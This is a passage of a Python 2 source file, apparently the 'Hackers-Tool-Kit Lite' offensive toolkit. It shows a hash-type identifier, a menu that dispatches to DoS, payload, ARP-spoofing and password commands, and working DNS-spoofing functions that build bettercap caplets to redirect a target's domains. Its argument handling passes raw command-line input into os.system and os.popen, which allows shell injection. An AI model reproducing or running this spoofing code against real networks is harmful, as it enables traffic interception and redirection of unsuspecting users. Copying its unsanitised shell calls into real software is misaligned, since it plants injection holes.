		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109380")
		def sha1usernamepasssalt():
		    hs='00025111b3c4d0ac1635558ce2393f77e94770c5'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109400")
		def sha1md5pass():
		    hs='fa960056c0dea57de94776d3759fb555a15cae87'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("1094202")
		def sha1md5passsalt():
		    hs='1dad2b71432d83312e61d25aeb627593295bcc9a'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109440")
		def sha1md5sha1pass():
		    hs='8bceaeed74c17571c15cdb9494e992db3c263695'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109460")
		def sha1sha1pass():
		    hs='3109b810188fcde0900f9907d2ebcaa10277d10e'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109480")
		def sha1sha1passsalt():
		    hs='780d43fa11693b61875321b6b54905ee488d7760'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109500")
		def sha1sha1passsubstrpass03():
		    hs='5ed6bc680b59c580db4a38df307bd4621759324e'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109520")
		def sha1sha1saltpass():
		    hs='70506bac605485b4143ca114cbd4a3580d76a413'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109540")
		def sha1sha1sha1pass():
		    hs='3328ee2a3b4bf41805bd6aab8e894a992fa91549'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109560")
		def sha1strtolowerusernamepass():
		    hs='79f575543061e158c2da3799f999eb7c95261f07'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("109580")

		def Haval192():
		    hs='cd3a90a3bebd3fa6b6797eba5dab8441f16a7dfa96c6e641'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("110040")
		def Haval192HMAC():
		    hs='39b4d8ecf70534e2fd86bb04a877d01dbf9387e640366029'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("110080")
		def Tiger192():
		    hs='c086184486ec6388ff81ec9f235287270429b2253b248a70'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("110020")
		def Tiger192HMAC():
		    hs='8e914bb64353d4d29ab680e693272d0bd38023afa3943a41'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("110060")

		def MD5passsaltjoomla1():
		    hs='35d1c0d69a2df62be2df13b087343dc9:BeKMviAfcXeTPTlX'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
			jerar.append("112020")

		def SHA1Django():
		    hs='sha1$Zion3R$299c3d65a0dcab1fc38421783d64d0ecf4113448'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:5].find('sha1$')==0:
			jerar.append("113020")

		def Haval224():
		    hs='f65d3c0ef6c56f4c74ea884815414c24dbf0195635b550f47eac651a'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("114040")
		def Haval224HMAC():
		    hs='f10de2518a9f7aed5cf09b455112114d18487f0c894e349c3c76a681'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("114080")
		def SHA224():
		    hs='e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("114020")
		def SHA224HMAC():
		    hs='c15ff86a859892b5e95cdfd50af17d05268824a6c9caaa54e4bf1514'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("114060")

		def SHA256():
		    hs='2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115020")
		def SHA256HMAC():
		    hs='d3dd251b7668b8b6c12e639c681e88f2c9b81105ef41caccb25fcde7673a1132'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115120")
		def Haval256():
		    hs='7169ecae19a5cd729f6e9574228b8b3c91699175324e6222dec569d4281d4a4a'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115040")
		def Haval256HMAC():
		    hs='6aa856a2cfd349fb4ee781749d2d92a1ba2d38866e337a4a1db907654d4d4d7a'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115140")
		def GOSTR341194():
		    hs='ab709d384cce5fda0793becd3da0cb6a926c86a8f3460efb471adddee1c63793'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115060")
		def RipeMD256():
		    hs='5fcbe06df20ce8ee16e92542e591bdea706fbdc2442aecbf42c223f4461a12af'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115080")
		def RipeMD256HMAC():
		    hs='43227322be1b8d743e004c628e0042184f1288f27c13155412f08beeee0e54bf'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115160")
		def SNEFRU256():
		    hs='3a654de48e8d6b669258b2d33fe6fb179356083eed6ff67e27c5ebfa4d9732bb'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115100")
		def SNEFRU256HMAC():
		    hs='4e9418436e301a488f675c9508a2d518d8f8f99e966136f2dd7e308b194d74f9'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115180")
		def SHA256md5pass():
		    hs='b419557099cfa18a86d1d693e2b3b3e979e7a5aba361d9c4ec585a1a70c7bde4'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115200")
		def SHA256sha1pass():
		    hs='afbed6e0c79338dbfe0000efe6b8e74e3b7121fe73c383ae22f5b505cb39c886'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("115220")

		def MD5passsaltjoomla2():
		    hs='fb33e01e4f8787dc8beb93dac4107209:fxJUXVjYRafVauT77Cze8XwFrWaeAYB2'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[32:33].find(':')==0:
			jerar.append("116020")
		def SAM():
		    hs='4318B176C3D8E3DEAAD3B435B51404EE:B7C899154197E8A2A33121D76A240AB5'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash.islower()==False and hash[32:33].find(':')==0:
			jerar.append("116040")

		def SHA256Django():
		    hs='sha256$Zion3R$9e1a08aa28a22dfff722fad7517bae68a55444bb5e2f909d340767cec9acf2c3'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha256')==0:
			jerar.append("117020")

		def RipeMD320():
		    hs='b4f7c8993a389eac4f421b9b3b2bfb3a241d05949324a8dab1286069a18de69aaf5ecc3c2009d8ef'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("118020")
		def RipeMD320HMAC():
		    hs='244516688f8ad7dd625836c0d0bfc3a888854f7c0161f01de81351f61e98807dcd55b39ffe5d7a78'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("118040")

		def SHA384():
		    hs='3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("119020")
		def SHA384HMAC():
		    hs='bef0dd791e814d28b4115eb6924a10beb53da47d463171fe8e63f68207521a4171219bb91d0580bca37b0f96fddeeb8b'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("119040")

		def SHA256s():
		    hs='$6$g4TpUQzk$OmsZBJFwvy6MwZckPvVYfDnwsgktm2CckOlNJGy9HNwHSuHFvywGIuwkJ6Bjn3kKbB6zoyEjIYNMpHWBNxJ6g.'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:3].find('$6$')==0:
			jerar.append("120020")

		def SHA384Django():
		    hs='sha384$Zion3R$88cfd5bc332a4af9f09aa33a1593f24eddc01de00b84395765193c3887f4deac46dc723ac14ddeb4d3a9b958816b7bba'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==False and hash[0:6].find('sha384')==0:
			print " [+] SHA-384(Django)"
			jerar.append("121020")

		def SHA512():
		    hs='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("122020")
		def SHA512HMAC():
		    hs='dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("122060")
		def Whirlpool():
		    hs='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("122040")
		def WhirlpoolHMAC():
		    hs='77996016cf6111e97d6ad31484bab1bf7de7b7ee64aebbc243e650a75a2f9256cef104e504d3cf29405888fca5a231fcac85d36cd614b1d52fce850b53ddf7f9'
		    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
			jerar.append("122080")


		print logo
		while True:
		    jerar=[]
		    print """
		   -------------------------------------------------------------------------"""
		    hash = raw_input(" HASH: ")
		    ADLER32(); CRC16(); CRC16CCITT(); CRC32(); CRC32B(); DESUnix(); DomainCachedCredentials(); FCS16(); GHash323(); GHash325(); GOSTR341194(); Haval128(); Haval128HMAC(); Haval160(); Haval160HMAC(); Haval192(); Haval192HMAC(); Haval224(); Haval224HMAC(); Haval256(); Haval256HMAC(); LineageIIC4(); MD2(); MD2HMAC(); MD4(); MD4HMAC(); MD5(); MD5APR(); MD5HMAC(); MD5HMACWordpress(); MD5phpBB3(); MD5Unix(); MD5Wordpress(); MD5Half(); MD5Middle(); MD5passsaltjoomla1(); MD5passsaltjoomla2(); MySQL(); MySQL5(); MySQL160bit(); NTLM(); RAdminv2x(); RipeMD128(); RipeMD128HMAC(); RipeMD160(); RipeMD160HMAC(); RipeMD256(); RipeMD256HMAC(); RipeMD320(); RipeMD320HMAC(); SAM(); SHA1(); SHA1Django(); SHA1HMAC(); SHA1MaNGOS(); SHA1MaNGOS2(); SHA224(); SHA224HMAC(); SHA256(); SHA256s(); SHA256Django(); SHA256HMAC(); SHA256md5pass(); SHA256sha1pass(); SHA384(); SHA384Django(); SHA384HMAC(); SHA512(); SHA512HMAC(); SNEFRU128(); SNEFRU128HMAC(); SNEFRU256(); SNEFRU256HMAC(); Tiger128(); Tiger128HMAC(); Tiger160(); Tiger160HMAC(); Tiger192(); Tiger192HMAC(); Whirlpool(); WhirlpoolHMAC(); XOR32(); md5passsalt(); md5saltmd5pass(); md5saltpass(); md5saltpasssalt(); md5saltpassusername(); md5saltmd5pass(); md5saltmd5passsalt(); md5saltmd5passsalt(); md5saltmd5saltpass(); md5saltmd5md5passsalt(); md5username0pass(); md5usernameLFpass(); md5usernamemd5passsalt(); md5md5pass(); md5md5passsalt(); md5md5passmd5salt(); md5md5saltpass(); md5md5saltmd5pass(); md5md5usernamepasssalt(); md5md5md5pass(); md5md5md5md5pass(); md5md5md5md5md5pass(); md5sha1pass(); md5sha1md5pass(); md5sha1md5sha1pass(); md5strtouppermd5pass(); sha1passsalt(); sha1saltpass(); sha1saltmd5pass(); sha1saltmd5passsalt(); sha1saltsha1pass(); sha1saltsha1saltsha1pass(); sha1usernamepass(); sha1usernamepasssalt(); sha1md5pass(); sha1md5passsalt(); sha1md5sha1pass(); sha1sha1pass(); sha1sha1passsalt(); sha1sha1passsubstrpass03(); sha1sha1saltpass(); sha1sha1sha1pass(); sha1strtolowerusernamepass()

		    if len(jerar)==0:
			print ""
			print " Not Found."
		    elif len(jerar)>2:
			jerar.sort()
			print ""
			print "Possible Hashs:"
			print "[+] ",algorithms[jerar[0]]
			print "[+] ",algorithms[jerar[1]]
			print ""
			print "Least Possible Hashs:"
			for a in range(int(len(jerar))-2):
			    print "[+] ",algorithms[jerar[a+2]]
		    else:
			jerar.sort()
			print ""
			print "Possible Hashs:"
			for a in range(len(jerar)):
			    print "[+] ",algorithms[jerar[a]]
	except:
		print "\n"
def aserver():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	print Y+"Starting Server\033[0m..."
	os.system("service apache2 start")
	br = raw_input(G+"Browser: \033[0m")
	a = '{0} {1}'.format(br,ipaddr)
	os.system(a)
	stop = raw_input("\033[1mhit enter to stop server:\033[0m ")
	print Y+"Stopping Server\033[0m..."
	os.system("service apache2 stop")

def terminal():
	os.system("gnome-terminal")

def dnsspoof():
	target = raw_input("\033[1mTarget:\033[0m ")
	domain1 = raw_input("\033[1mDomain1:\033[0m ")
	domain2 = raw_input("\033[1mDomain2:\033[0m ")
	os.system('echo "net.sniff on\n" >> dns.cap')
	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dns.cap'.format(domain1,domain2))
	os.system('echo "set dns.spoof.address {0}\n" >> dns.cap'.format(target))
	os.system('echo "dns.spoof on\n" >> dns.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet dns.cap")
	os.system("rm dns.cap")

def dnsspoofall():
	domain1 = raw_input("\033[1mDomain1:\033[0m ")
	domain2 = raw_input("\033[1mDomain2:\033[0m ")
	os.system('echo "net.sniff on\n" >> dnsall.cap')
	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dnsall.cap'.format(domain1,domain2))
	os.system('echo "set dns.spoof.all true\n" >> dnsall.cap')
	os.system('echo "dns.spoof on\n" >> dnsall.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet dnsall.cap")
	os.system("rm dnsall.cap")

def main():
	found = False
	while not found:
		try:
			x = raw_input('\033[0mHTK{0}{1}\033[0mLite: '.format(random.choice(colorlist), random.choice(inputlist)))

			if x == "clear":
				os.system("clear")
			if x == "exit":
				print "\nfollow @tuf_unkn0wn on instagram"
				print "\nExiting..."
				break
				os.system("service tor stop")
				os.system("service postgresql stop")
				sys.exit()

			if x == "banner":
				mainbanner()
			if x == "?":
				helpbanner()
			if x == "infoscan":
				infoscan()
			if x == "infoscan -o":
				specscan()
			if x == "dos":
				dos()
			if x == "payload":
				payload()
			if x == "password":
				password()
			if x == "reboot":
				reboot()
			if x == "monitor on":
				monitoron()
			if x == "monitor off":
				monitoroff()
			if x == "command":
				command()
			if x == "anon on":
				anonon()
			if x == "anon off":
				anonoff()
			if x == "sysinfo":
				sysinfo()
			if x == "netscan":
				netscan()
			if x == "verscan":
				verscan()
			if x == "wordlist":
				wordlist()
			if x == "arpspoof":
				arpspoof()
			if x == "traff":
				traff()
			if x == "hashid":
				hashid()
			if x == "aserver":
				aserver()
			if x == "terminal":
				terminal()
			if x == "dnsspoof":
				dnsspoof()
			if x == "dnsspoof --all":
				dnsspoofall()

		except:
			print "\nfollow @tuf_unkn0wn on instagram"
			print "\nExiting..."
			break
			os.system("service tor stop")
			os.system("service postgresql stop")
	found = True
try:
	if len(sys.argv) < 2:
		starting()
		print "{0}Welc{1}ome T{2}o Hacke{3}rs-Too{4}l-Kit{5} Lite\033[0m".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
		time.sleep(1.8)
		mainbanner()
		main()
	if sys.argv[1] == "-h":
		print """
--------------------------------------------------------------
-h              : this menu

--commandsearch : search for specific commands

--commandinfo   : more info about the commands

--commandcount  : see how many commands are available

--run           : run a command in htk-lite from the terminal

--proxy         : run htkl with proxychains

--quickrun      : run htkl without starting menu
--------------------------------------------------------------
		"""
	if sys.argv[1] == "--run":
		if len(sys.argv) < 3:
			print "Not Enough Arguments"
			sys.exit()
		os.system("python commandlist/{0}.py".format(sys.argv[2]))
		main()
	if sys.argv[1] == "--commandcount":
		a = os.popen("ls commandlist -1 | wc -l").read()
		b = a.replace('\n', '')
		if b == "1":
			print "(\033[32m{0}\033[0m) Command is available".format(b)
		else:
			print "(\033[32m{0}\033[0m) Commands are available".format(b)
	if sys.argv[1] == "--proxy":
		os.system("service tor restart")
		os.system("proxychains python htkl.py")

	if sys.argv[1] == "--quickrun":
		mainbanner()
		main()

	if sys.argv[1] == "--commandinfo":
		if len(sys.argv) < 3:
			print "Not Enough Arguments"
			sys.exit()
		try:
			command = os.popen('cat commandinfo/{0}.txt'.format(sys.argv[2])).read()
			print command
		except:
			print "No command named {0} available".format(command)
			
	if sys.argv[1] == "--commandsearch":
		if len(sys.argv) < 3:
			print "Not Enough Arguments"
			sys.exit()
		command = os.popen('find commandlist -name "*{0}*"'.format(sys.argv[2])).read()
		a = command.replace('commandlist/', '')
		b = a.replace('.py', '')
		c = b.replace('commandlist', '')

		print "Commands Found Matching '{0}':\n".format(sys.argv[2])
		print c
except:
	os.system("")
